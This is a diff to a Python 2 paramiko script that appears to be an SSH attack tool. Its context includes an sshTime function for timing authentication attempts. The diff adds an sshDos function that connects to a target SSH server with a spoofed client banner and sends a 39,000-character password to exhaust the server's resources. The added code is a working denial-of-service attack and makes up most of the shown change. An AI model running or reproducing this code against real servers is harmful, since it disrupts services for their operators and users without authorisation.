@@ -37,12 +37,14 @@ def fxn():
 with warnings.catch_warnings():
 	warnings.simplefilter("ignore")
 	import paramiko
+	
 import string
 import socket
 import time
 import os,sys
 import subprocess
 from threading import *
+
 screenLock = Semaphore(value=1)
 
 def sshTime(host,port,user,sock,defTime):
@@ -91,6 +93,38 @@ def sshTime(host,port,user,sock,defTime):
 		ret = -1
 	para.close()
 	return ret
+
+def sshDos(host,port,user,sock,defTime):
+
+	try:
+		sock.connect((host,int(port)))
+		para = paramiko.Transport(sock)
+		para.local_version="SSH-2.0-Blabla"
+
+	except paramiko.SSHException: 
+		print "Unable to connect to host"
+		exit(1)   
+    
+	try:
+		para.connect(username=user)
+
+	except EOFError,e:
+		exit(1)   
+
+	except paramiko.SSHException,e:
+        	exit(1)   
+
+    	passwd = 'A'*39000
+
+	try:
+		para.auth_password(user,passwd)
+	except paramiko.AuthenticationException,e:
+		print
+	except paramiko.SSHException,e:
+		print
+
+	para.close()
+	sock.close()
 
 def sshBanner(host,port):
 
